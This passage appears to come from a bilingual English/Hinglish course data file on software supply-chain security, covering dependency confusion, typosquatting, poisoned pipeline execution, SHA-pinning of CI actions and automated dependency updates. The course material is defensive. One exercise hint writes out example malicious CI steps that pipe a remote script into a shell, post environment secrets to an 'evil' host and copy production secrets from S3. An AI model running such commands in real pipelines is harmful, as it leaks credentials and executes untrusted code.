        whyHi: 'Dependency confusion tab kaam karता hai jab ek package name jिspar aapkा build depend karता hai ek se zyada source se resolve ho sakता hai aur resolver higher version number pick karता hai bina is regard ke ki ye konse source se aaya. Agmar \`@acme/logger\` ek private package hai par aapkा resolver configuration ise public registry par bhi look up hone deता hai, ek attacker jо \`@acme/logger\` publicly version 99 par publish karता hai version comparison jeetता hai, aur unka package — jо bhi install script ye carry karता hai — wo hai jо next clean resolve par install hota hai. Fix scope ko unambiguous banaना hai: resolver ko configure karो taaki \`@acme/\` scope ke under kुछ bhi sirf internal registry se fetch ho, aur baaki saara traffic ek proxy ke through route karो jо ek missing \`@acme/\` package ko ek error ke roop mein treat karता hai.',
      },
      {
        wrong: `# pin everything hard, then never update -> a frozen, known-vulnerable tree
  # package.json: every dep pinned to an exact version, committed lockfile. good!
  # ...for 18 months. no Renovate, no Dependabot, "updates break things".
  # the SCA scan on every PR now reports 90 CVEs, 12 CRITICAL, growing weekly.
  # the team baselined ALL of them ("pre-existing") so the gate stays green.
  # when they finally must update (a CRITICAL with active exploitation), it's a
  # 200-commit dependency bump across 3 major versions, touching every part of the
  # app, done under incident pressure. it takes 3 weeks and causes 2 outages.`,
        right: `# automate small, frequent, reviewed updates
  # renovate.json:
  #   { "extends": ["config:recommended"],
  #     "schedule": ["before 9am on monday"],
  #     "packageRules": [
  #       { "matchDepTypes": ["devDependencies"], "matchUpdateTypes": ["patch","minor"],
  #         "automerge": true },                       # green CI -> merges itself
  #       { "matchUpdateTypes": ["major"], "automerge": false, "labels": ["major-review"] }
  #     ],
  #     "minimumReleaseAge": "3 days",                 # skip the compromised-release window
  #     "lockFileMaintenance": { "enabled": true } }
  # result: ~5-15 small PRs/week, each with the changelog + full CI + SBOM diff.
  # patch bumps to dev deps merge automatically; app-dep and major bumps get a
  # 2-minute human review. the tree is never more than a week stale. no big-bang.`,
        why: 'Pinning without an update mechanism trades one risk for another: you gain reproducibility and protection against a surprise upstream change, but you lose the security patches that come with new versions, and the gap compounds every week. The SCA scan keeps finding new CVEs in versions you are not moving off, the team baselines them to keep the gate green, and the real security posture degrades invisibly behind a passing check. Eventually a vulnerability appears that cannot be baselined away — one under active exploitation, or one a customer or auditor demands be fixed — and the update that was deferred for a year and a half is now a massive, multi-major-version bump touching the whole application, performed under pressure, with a high chance of introducing regressions. Automating updates inverts this. A tool opens a small pull request per update or per group, with the changelog and release notes attached, and your existing CI — tests, SCA, SBOM diff — runs on it, so each update is a reviewable unit with evidence. Patch-level updates to development dependencies can auto-merge on green CI; application dependencies and major versions get a quick human review; a minimum-release-age setting avoids taking a version during the window when a compromised release is live but not yet flagged. The dependency tree stays close to current continuously, and there is never a big migration to dread.',
        whyHi: 'Pinning bina ek update mechanism ke ek risk ko doosre ke liye trade karता hai: aap reproducibility aur ek surprise upstream change ke against protection gain karते ho, par aap security patches lose karते ho jо new versions ke saath aate hain, aur gap har hafte compound hoता hai. SCA scan un versions mein naye CVEs dhoondhता rehता hai jinse aap move nahi kar rahe, team unhe baseline karती hai gate ko green rakhने ke liye, aur real security posture ek passing check ke peeche invisibly degrade hoती hai. Eventually ek vulnerability appear hoती hai jise baseline nahi kiya ja sakта — active exploitation ke tehat ek — aur wo update jо ek saal se defer kiya gaya ab ek massive, multi-major-version bump hai. Updates automate karना ise invert karता hai. Ek tool per update ek chhota pull request kholता hai, changelog attached ke saath, aur aapkा existing CI ispar run hota hai. Dependency tree continuously current ke paas rehता hai.',
      },
    ],

    realWorld: [
      {
        en: '**Dependency confusion, Alex Birsan (2021)** — a researcher published packages with the internal names of Apple, Microsoft, PayPal, Shopify, and others to public npm/PyPI/RubyGems at high versions. Build systems at 35+ companies pulled and executed his benign payload, proving the attack at scale. Every major package ecosystem and proxy vendor shipped mitigations in response.',
        hi: '**Dependency confusion, Alex Birsan (2021)** — ek researcher ne Apple, Microsoft, PayPal, Shopify ke internal names ke saath packages public npm/PyPI/RubyGems par high versions par publish kiye. 35+ companies ke build systems ne uska benign payload pull aur execute kiya, attack ko scale par prove kiya.',
      },
      {
        en: '**tj-actions/changed-files (2025)** — a widely-used GitHub Action was compromised; the attacker force-moved many version tags to a malicious commit that dumped CI runner memory (secrets) into build logs. Repos pinning the action by tag (`@v44`) were exposed; repos pinning by full SHA were not. This is the concrete case for SHA-pinning every action.',
        hi: '**tj-actions/changed-files (2025)** — ek widely-used GitHub Action compromise hua; attacker ne kई version tags ko ek malicious commit par force-move kiya jо CI runner memory (secrets) ko build logs mein dump karता tha. Tag se pin karne wale repos exposed the; full SHA se pin karne wale nahi the.',
      },
      {
        en: '**Renovate/Dependabot as standard practice** — most active open-source projects and a large share of companies now run one of these. The observable effect: projects that adopt them keep their dependency lag under ~2 weeks and handle a critical CVE with a one-line version bump PR, versus projects without them facing multi-week migrations.',
        hi: '**Renovate/Dependabot as standard practice** — zyादातर active open-source projects aur companies ka ek bada share ab in mein se ek chalाते hain. Observable effect: jо projects unhe adopt karते hain apna dependency lag ~2 hafton ke neeche rakhते hain aur ek critical CVE ko ek one-line version bump PR se handle karते hain.',
      },
    ],

    interviewQA: [
      {
        q: 'What is poisoned pipeline execution, what is the difference between the direct and indirect forms, and how do you prevent both?',
        qHi: 'Poisoned pipeline execution kya hai, direct aur indirect forms mein kya farak hai, aur aap dono kaise prevent karते ho?',
        a: 'Poisoned pipeline execution is getting the CI system to run code the attacker controls, so that code executes with the pipeline\'s privileges — the registry token, the cloud role, the signing key, the default-branch token. In the direct form, the attacker can edit the pipeline definition itself: a fork pull request modifying a workflow file where fork PRs run privileged, an unprotected branch, an editable \`.gitlab-ci.yml\`. They add a step that exfiltrates secrets or fetches and runs a remote script. In the indirect form, the attacker cannot edit the pipeline but the pipeline runs a file they can edit — a Makefile, an npm scripts block, a Gradle file, a test or linter configuration, a pre-commit definition. If a CI job runs "make build" or "the linter" and that configuration comes from the pull request branch, changing it runs attacker code. Prevention for both: untrusted pull requests, which means every fork PR, run with no secrets, a read-only token, and no OIDC — only lint, tests, and scanners. Anything privileged runs only on a push to a protected branch, after merge and review, never against unreviewed PR code. On GitHub specifically, avoid \`pull_request_target\` combined with an explicit checkout of the PR head. Workflow files are protected by code owners and required review. Third-party actions are pinned to full commit SHAs. And each workflow\'s token permissions default to read-only and are widened only per-job where needed.',
        aHi: 'Poisoned pipeline execution CI system se code chalvana hai jise attacker control karता hai, taaki wo code pipeline ke privileges ke saath execute ho — registry token, cloud role, signing key, default-branch token. Direct form mein, attacker pipeline definition khud edit kar sakता hai: ek fork pull request jо ek workflow file modify karता hai jahaan fork PRs privileged run hote hain, ek unprotected branch. Wo ek step add karते hain jо secrets exfiltrate karता hai. Indirect form mein, attacker pipeline edit nahi kar sakता par pipeline ek file chalाती hai jise wo edit kar sakते hain — ek Makefile, ek npm scripts block, ek test ya linter configuration. Dono ke liye prevention: untrusted pull requests koi secrets ke bina run hote hain, ek read-only token, aur koi OIDC nahi. Kुछ bhi privileged sirf ek protected branch par push par run hota hai, merge aur review ke baad. Workflow files code owners dwara protected hain. Third-party actions full commit SHAs par pinned hain.',
      },
      {
        q: 'Explain dependency confusion and typosquatting, and the defences for each.',
        qHi: 'Dependency confusion aur typosquatting samjhाओ, aur har ek ke liye defences.',
        a: 'Both trick your dependency resolver into fetching attacker-controlled code, but by different mechanisms. Dependency confusion targets a build that can resolve a package name from more than one registry. If you have a private internal package — say \`@acme/config\` — published only to your internal registry, an attacker publishes a package with the identical name to the public registry at a very high version number. A resolver that consults both sources and takes the highest version pulls the attacker\'s public package, and its install script runs on whatever machine did the resolve, including a CI runner. The defence is to make scopes unambiguous: configure the resolver so anything under \`@acme/\` is fetched only from the internal registry, ideally through a proxy that never falls through to the public registry for your namespaces and treats a missing internal package as an error; additionally, reserve your scope names on the public registry with placeholder packages. Typosquatting is simpler: the attacker registers a package whose name is a plausible misspelling of a popular one — \`reqessts\`, \`lodahs\`, \`python-dateutils\` — with a malicious install script, and waits for a developer to mistype an install command. The main defence is a committed lockfile, because an unexpected package name shows up in the lockfile diff during review; an install-time allowlist and an organisational package firewall add more. LLM-hallucinated package names, where a model suggests installing something that does not exist and an attacker registers it, are a newer variant with the same defences.',
        aHi: 'Dono aapke dependency resolver ko attacker-controlled code fetch karने mein trick karते hain, par alag mechanisms se. Dependency confusion ek build ko target karता hai jо ek se zyada registry se ek package name resolve kar sakता hai. Agmar aapke paas ek private internal package hai — say \`@acme/config\` — sirf aapke internal registry par published, ek attacker identical name ke saath ek package public registry par ek bahut high version number par publish karता hai. Ek resolver jо dono sources consult karता hai aur highest version leता hai attacker ka public package pull karता hai. Defence scopes ko unambiguous banaना hai. Typosquatting simpler hai: attacker ek package register karता hai jिska naam ek popular one ki ek plausible misspelling hai. Main defence ek committed lockfile hai, kyunki ek unexpected package name lockfile diff mein dikhता hai.',
      },
      {
        q: 'Why should CI actions be pinned by commit SHA rather than tag, and how does dependency-update automation make pinning sustainable?',
        qHi: 'CI actions ko tag ke bजाy commit SHA se kyun pin karना chahिए, aur dependency-update automation pinning ko kaise sustainable banाता hai?',
        a: 'A CI action is a dependency that executes with the pipeline\'s full privileges, so it deserves the same pinning discipline as a library. A tag like \`@v4\` is a mutable pointer: the action\'s maintainer, or anyone who compromises the maintainer\'s account or the action\'s repository, can move that tag to a different commit — including a malicious one — and every workflow referencing \`@v4\` picks up the new code on its next run with no change on your side. This has happened in practice: a widely-used action was compromised and its version tags force-moved to a commit that dumped runner memory, containing secrets, into build logs; repositories that pinned by tag were exposed, and those that pinned by full commit SHA were not, because a SHA names an immutable object. The cost of SHA pinning is legibility — \`@8ade135a...\` does not tell you it is version 4.1.7 — and that is exactly what dependency-update automation solves. Renovate or Dependabot tracks the upstream releases, and when a new version is published it opens a pull request that updates the pinned SHA and includes a comment stating which version the new SHA corresponds to, plus the changelog. You review a small, documented change and merge it, and CI validates it. So you get the immutability of SHA pinning without the tree going stale and without losing track of which versions you are on — updates are small, frequent, and reviewed rather than a manual chore that gets skipped.',
        aHi: 'Ek CI action ek dependency hai jо pipeline ke full privileges ke saath execute hota hai, to ise ek library ke same pinning discipline deserve karता hai. Ek tag jaise \`@v4\` ek mutable pointer hai: action ka maintainer, ya jо bhi maintainer ka account compromise karता hai, us tag ko ek alag commit par move kar sakта hai — ek malicious one bhi — aur \`@v4\` reference karने wala har workflow apne next run par naya code pick karता hai. Ye practice mein hua hai: ek widely-used action compromise hua aur iske version tags ek commit par force-move kiye gaye jо runner memory dump karता tha. Tag se pin karne wale repositories exposed the; full commit SHA se pin karne wale nahi the. SHA pinning ki cost legibility hai, aur wo exactly wo hai jо dependency-update automation solve karता hai. Renovate ya Dependabot upstream releases track karता hai aur ek pull request kholता hai jо pinned SHA update karता hai aur ek comment include karता hai.',
      },
    ],

    exercises: [
      {
        task: 'In a comment, explain poisoned pipeline execution: direct vs indirect PPE with concrete examples of each, what the attacker gets, and the prevention rules (fork-PR credential rules, privileged-work-on-push-only, workflow CODEOWNERS).',
        taskHi: 'Ek comment mein, poisoned pipeline execution samjhाओ: direct vs indirect PPE.',
        hint: 'POISONED PIPELINE EXECUTION (PPE) = get the CI to run code the ATTACKER controls, so it executes WITH THE PIPELINE\'S PRIVILEGES: the registry push token, the cloud OIDC role, the artifact-signing key material, a token that can push to the DEFAULT BRANCH. DIRECT PPE — the attacker can edit the PIPELINE DEFINITION ITSELF: a fork PR editing `.github/workflows/*.yml` (where fork PRs run privileged), a branch WITHOUT protection rules, an unprotected `.gitlab-ci.yml`. They add a step: `curl evil.sh | sh`, or `env | curl -d @- https://evil`, or `aws s3 cp s3://prod-secrets/ . --recursive`. INDIRECT PPE — the attacker CANNOT edit the pipeline, but the pipeline RUNS A FILE THEY CAN EDIT: a `Makefile`, an npm `scripts` block (`postinstall`, `pretest`), a `build.gradle`, a `conftest.py`, a `.pre-commit-config.yaml`, a lint/test config the CI executes, a "run the linter" step that executes a config FROM THE PR BRANCH. If a CI job runs `make ci` / `npm test` / "the linter" and ANY of that config comes from the PR branch → a PR that changes that config is running attacker code. BOTH end identically: attacker code on the runner with all the creds. PREVENTION RULES: (1) FORK-PR CREDENTIAL RULES — `pull_request` from a fork: NO secrets, read-only `GITHUB_TOKEN`, NO OIDC → SAFE for lint/test/scan (this is the DEFAULT — keep it). `pull_request_target`: runs in the BASE repo context WITH secrets — DANGEROUS if you then explicitly check out `github.event.pull_request.head.sha` and run its code/deps (hands fork code the base secrets). Usually a mistake — avoid the combo. (2) PRIVILEGED WORK ON PUSH ONLY — deploy / publish / sign runs ONLY on `push` to a PROTECTED branch, AFTER merge + review, against a script that lives ON MAIN (not from a PR). Use `environment: production` (required reviewers + a deploy log) + a short-lived scoped OIDC role (NOT a long-lived deploy key). (3) WORKFLOW CODEOWNERS — `/.github/ @acme/platform-security` so a workflow edit needs security review; branch protection with NO admin bypass so a malicious workflow change can\'t merge unreviewed. (4) least-privilege `permissions:` (default `contents: read`, widen per-job). (5) SHA-pin every action. DEFENCE IN DEPTH: each control is bypassable alone; together, one compromised dev account can open a PR (the point!) but can\'t merge a workflow change unreviewed, can\'t assume the deploy role from a PR, can\'t deploy without a second human.',
        hintHi: 'PPE = CI se ATTACKER ka code chalvao, taaki ye PIPELINE KE PRIVILEGES ke saath execute ho: registry token, cloud OIDC role, signing key, default-branch token. DIRECT PPE — attacker PIPELINE DEFINITION KHUD edit kar sakта hai: ek fork PR `.github/workflows/*.yml` edit karता hai, ek unprotected branch. Step add: `curl evil.sh | sh`. INDIRECT PPE — attacker pipeline edit NAHI kar sakта, par pipeline EK FILE CHALATI HAI JISE WO EDIT KAR SAKTE HAIN: `Makefile`, npm `scripts` (`postinstall`), `build.gradle`, lint/test config FROM THE PR BRANCH. DONO same end. PREVENTION: (1) `pull_request` fork se: NO secrets, read-only token, NO OIDC. `pull_request_target` + explicit PR-head checkout = DANGER. (2) privileged work SIRF `push` par protected branch par, merge + review ke BAAD; `environment: production` + short-lived OIDC role. (3) `/.github/` par CODEOWNERS + branch protection NO admin bypass. (4) least-privilege `permissions:`. (5) har action SHA-pin. DEFENCE IN DEPTH: ek compromised account PR khol sakта hai par workflow change unreviewed merge nahi kar sakта.',
      },
      {
        task: 'In a comment, explain dependency confusion and typosquatting (the mechanism of each, a concrete example) and the full defence set for each.',
        taskHi: 'Ek comment mein, dependency confusion aur typosquatting samjhाओ aur har ek ke liye full defence set.',
        hint: 'Both trick your RESOLVER into fetching attacker code; different mechanisms. DEPENDENCY CONFUSION — targets a build that can resolve a package name from MORE THAN ONE registry. You have a PRIVATE internal package `@acme/config` published ONLY to your internal registry. An attacker publishes `@acme/config` to the PUBLIC npm registry at `v99.0.0`. A resolver that consults BOTH sources and takes the HIGHEST version → pulls the attacker\'s PUBLIC package → its `postinstall` runs on whatever did the resolve (a dev machine, or the CI RUNNER). (Real: Alex Birsan 2021 — published the internal package names of Apple / Microsoft / PayPal / Shopify to public npm/PyPI/RubyGems at high versions; build systems at 35+ companies executed his payload.) DEFENCES: (1) BIND each private scope to the private registry: `.npmrc` → `@acme:registry=https://npm.acme.internal/` so `@acme/*` comes ONLY from there. (2) route everything else through a PROXY (Verdaccio / Artifactory / Nexus) that serves public packages from cache but treats a missing `@acme/*` as an ERROR — NEVER a fallthrough to npmjs. (3) RESERVE your scope/package names on the PUBLIC registry with placeholder packages. (4) a committed LOCKFILE → a resolution-source change shows in the diff. (5) assert `npm config get @acme:registry` in CI. TYPOSQUATTING — the attacker registers a package whose name is a PLAUSIBLE MISSPELLING of a popular one: `reqessts` (requests), `python-dateutils` (python-dateutil), `lodahs` (lodash), `djnago` (django) — with a malicious install script — and waits for a dev to mistype an install command or a reviewer to skim past it. DEFENCES: (1) a committed LOCKFILE — an unexpected/unknown package name appears in the lockfile diff for review (the single strongest defence). (2) an install-time ALLOWLIST of permitted packages. (3) an org-level PACKAGE FIREWALL (Socket, Snyk, Artifactory curation) that blocks newly-published / low-reputation / known-malicious packages. (4) `--ignore-scripts` by default + an allowlist of packages permitted to run install scripts. RELATED NEWER VARIANTS, same defences: STARJACKING (faking repo stats to look legit), SLOPSQUATTING (an LLM hallucinates a plausible package name in `pip install ...`, an attacker registers it).',
        hintHi: 'Dono aapke RESOLVER ko attacker code fetch karने mein trick karते hain; alag mechanisms. DEPENDENCY CONFUSION — ek build jо ek naam ko EK SE ZYADA registry se resolve kar sakта hai. Aapkा PRIVATE `@acme/config` sirf internal registry par. Attacker `@acme/config@99.0.0` PUBLIC npm par publish karता hai. Resolver DONO check karता hai, HIGHEST version leता hai → attacker ka PUBLIC package → `postinstall` CI RUNNER par run hota hai. (Alex Birsan 2021, 35+ companies.) DEFENCES: (1) `@acme:registry=https://npm.acme.internal/` — `@acme/*` SIRF wahaan se. (2) ek PROXY jо missing `@acme/*` ko ERROR treat karता hai, npmjs par fallthrough NAHI. (3) public registry par scope names RESERVE karो. (4) committed LOCKFILE. (5) CI mein `npm config get @acme:registry` assert. TYPOSQUATTING — ek PLAUSIBLE MISSPELLING wala package: `reqessts`, `lodahs`, `djnago` — malicious install script ke saath. DEFENCES: (1) committed LOCKFILE (unknown name diff mein dikhता hai — strongest). (2) install-time ALLOWLIST. (3) org-level PACKAGE FIREWALL (Socket, Snyk). (4) `--ignore-scripts` default. VARIANTS: STARJACKING, SLOPSQUATTING (LLM-hallucinated names).',
      },
      {
        task: 'In a comment, explain why CI actions must be SHA-pinned (with the tj-actions incident), the legibility cost, and how Renovate/Dependabot make pinning sustainable — including grouping, schedules, auto-merge, and minimum-release-age.',
        taskHi: 'Ek comment mein, CI actions ko SHA-pin kyun karna, aur Renovate/Dependabot pinning ko sustainable kaise banाते hain.',
        hint: 'A CI ACTION IS A DEPENDENCY executed WITH THE PIPELINE\'S FULL PRIVILEGES → pin it like a library. `uses: actions/checkout@v4` pins to a TAG — a MUTABLE pointer. The action\'s maintainer (OR anyone who compromises their account / the action\'s repo) can force-MOVE that tag to a different commit, INCLUDING a malicious one, and every workflow on `@v4` picks up the new code on its NEXT run with ZERO change on your side. REAL: tj-actions/changed-files (2025) — compromised; many version tags force-moved to a malicious commit that dumped CI RUNNER MEMORY (secrets) into BUILD LOGS. Repos pinning by tag (`@v44`) → EXPOSED. Repos pinning by FULL COMMIT SHA (`@8ade135a...`) → NOT exposed, because a SHA names an IMMUTABLE object. THE LEGIBILITY COST: `@8ade135a...` doesn\'t tell you it\'s v4.1.7 — you lose "which version am I on" at a glance. THAT is exactly what update automation solves. RENOVATE / DEPENDABOT: track upstream releases; when a new version ships, open a PR that updates the pinned SHA + includes a COMMENT stating which version the new SHA is + the changelog/release notes; your existing CI (tests + SCA + SBOM diff) runs on it; you review a small documented change + merge. So you get SHA immutability WITHOUT the tree going stale or losing version visibility. WHY PINNING NEEDS AUTOMATION AT ALL: pinning WITHOUT an update process = you run KNOWN-VULNERABLE versions FOREVER — the SCA scan reports more CVEs weekly, the team baselines them to keep the gate green, the real posture degrades invisibly, and the eventual forced update (a CRITICAL under active exploitation) is a 200-commit multi-major bump done under incident pressure (3 weeks, 2 outages). CONFIG KNOBS: (1) GROUPING — related packages → ONE PR instead of 40. (2) SCHEDULE — e.g. "before 9am Monday" / weekly → PRs arrive predictably, not constantly. (3) AUTO-MERGE — patch/minor updates to DEV dependencies with GREEN CI merge themselves; app deps + MAJOR bumps → `automerge: false`, a label, a 2-min human review. (4) MINIMUM-RELEASE-AGE / "stability days" (e.g. `"minimumReleaseAge": "3 days"`) — refuse to propose a release < 3 days old → sidesteps the WINDOW when a compromised release is live but not yet flagged/yanked. (5) `lockFileMaintenance` — periodically refresh the whole lock. RESULT: ~5-15 small, boring, reviewed PRs/week; the tree is never more than a week stale; no scary annual big-bang.',
        hintHi: 'EK CI ACTION EK DEPENDENCY HAI jо PIPELINE KE FULL PRIVILEGES ke saath execute hota hai → ise ek library ki tarah pin karो. `uses: actions/checkout@v4` ek TAG par pin karता hai — ek MUTABLE pointer. Maintainer (YA jо bhi unka account compromise karता hai) us tag ko ek alag commit par force-MOVE kar sakта hai, malicious bhi, aur `@v4` wala har workflow NEXT run par naya code pick karता hai. REAL: tj-actions/changed-files (2025) — tags ek malicious commit par force-moved jо RUNNER MEMORY (secrets) ko BUILD LOGS mein dump karता tha. Tag-pinned repos → EXPOSED. FULL SHA-pinned → NOT. LEGIBILITY COST: `@8ade135a...` version nahi batाता. RENOVATE/DEPENDABOT: upstream track karता hai; ek PR kholता hai jо SHA update karता hai + ek COMMENT (konsी version) + changelog; CI ispar run hota hai; aap review + merge. PINNING KO AUTOMATION KYUN: pinning BINA update process = KNOWN-VULNERABLE versions HAMESHA → eventual forced update ek 200-commit multi-major bump under pressure. KNOBS: (1) GROUPING — ONE PR. (2) SCHEDULE — weekly. (3) AUTO-MERGE — dev deps patch/minor + GREEN CI. (4) MINIMUM-RELEASE-AGE "3 days" — compromised-release window sidestep. (5) `lockFileMaintenance`. RESULT: ~5-15 chhote reviewed PRs/week, tree kabhi > 1 week stale nahi.',
      },
    ],

    keyTakeaways: [
      'POISONED PIPELINE EXECUTION = getting CI to run the attacker\'s code with the pipeline\'s privileges (registry token, cloud role, signing key, default-branch token). DIRECT: the attacker edits the workflow/`.gitlab-ci.yml` itself (fork PR, unprotected branch). INDIRECT: they can\'t edit the pipeline but the pipeline runs a file they CAN edit — a Makefile, npm `scripts`, a lint/test config from the PR branch. Both end with attacker code on the runner holding all the creds.',
      'FORK-PR RULE: `pull_request` from a fork gets NO secrets / read-only token / no OIDC → safe for lint+test+scan (the default — keep it). `pull_request_target` + an explicit checkout of the PR head = the classic hole. Privileged work (deploy/publish/sign) runs ONLY on `push` to a protected branch, after merge+review, against a script that lives on main. Workflow files → CODEOWNERS + required review + no admin bypass. Default `permissions: contents: read`.',
      'DEPENDENCY CONFUSION: a private package name (`@acme/config`) also resolvable from the public registry → an attacker publishes it publicly at v99 and wins the version comparison. FIX: bind the scope to the private registry, proxy everything else with no public fallthrough for your scopes, reserve the names publicly, commit the lockfile. TYPOSQUATTING (`reqessts`, `lodahs`): a committed lockfile shows the unknown name in the diff; add an allowlist + a package firewall.',
      'SHA-PIN EVERY CI ACTION: `@v4` is a mutable tag that the maintainer — or an account compromise — can force-move to malware (tj-actions/changed-files, 2025: tags moved to a commit that dumped runner secrets into logs; SHA-pinned repos were safe). `@<full-sha>` is immutable. The legibility cost (a SHA doesn\'t show the version) is solved by Renovate/Dependabot keeping the pin current via a reviewable PR with a version comment.',
      'PINNING WITHOUT UPDATE AUTOMATION = running known-vulnerable versions forever, then a forced multi-major migration under incident pressure. Renovate/Dependabot open a small reviewed PR per update (changelog + full CI + SBOM diff attached). Config: group related packages, a weekly schedule, auto-merge patch-level dev deps on green CI, a `minimumReleaseAge` of ~3 days (sidesteps the compromised-release window), major bumps to manual review.',
    ],
    keyTakeawaysHi: [
      'POISONED PIPELINE EXECUTION = CI se attacker ka code pipeline ke privileges ke saath chalvana (registry token, cloud role, signing key, default-branch token). DIRECT: attacker workflow/`.gitlab-ci.yml` khud edit karता hai (fork PR, unprotected branch). INDIRECT: wo pipeline edit nahi kar sakते par pipeline ek file chalाती hai jise wo edit KAR sakते hain — ek Makefile, npm `scripts`, PR branch se ek lint/test config. Dono runner par attacker code ke saath end hote hain.',
      'FORK-PR RULE: ek fork se `pull_request` ko NO secrets / read-only token / no OIDC milता hai → lint+test+scan ke liye safe (default — ise rakhो). `pull_request_target` + PR head ka ek explicit checkout = classic hole. Privileged work SIRF `push` par ek protected branch par run hota hai, merge+review ke baad, main par rehने wali ek script ke against. Workflow files → CODEOWNERS + required review. Default `permissions: contents: read`.',
      'DEPENDENCY CONFUSION: ek private package name (`@acme/config`) jо public registry se bhi resolvable hai → ek attacker ise publicly v99 par publish karता hai aur version comparison jeetता hai. FIX: scope ko private registry se bind karो, baaki sab ko ek proxy se route karो aapke scopes ke liye koi public fallthrough ke bina, names publicly reserve karो, lockfile commit karो. TYPOSQUATTING (`reqessts`, `lodahs`): ek committed lockfile diff mein unknown name dikhाता hai.',
      'HAR CI ACTION KO SHA-PIN KARO: `@v4` ek mutable tag hai jise maintainer — ya ek account compromise — malware par force-move kar sakता hai (tj-actions/changed-files, 2025: tags ek commit par moved jо runner secrets ko logs mein dump karता tha; SHA-pinned repos safe the). `@<full-sha>` immutable hai. Legibility cost (ek SHA version nahi dikhाता) Renovate/Dependabot dwara solve hota hai.',
      'BINA UPDATE AUTOMATION KE PINNING = known-vulnerable versions hamesha ke liye chalाना, phir ek forced multi-major migration incident pressure ke tehat. Renovate/Dependabot per update ek chhota reviewed PR kholते hain (changelog + full CI + SBOM diff attached). Config: related packages group karो, ek weekly schedule, green CI par patch-level dev deps auto-merge, ~3 din ka ek `minimumReleaseAge`, major bumps manual review ko.',
    ],
  },
];
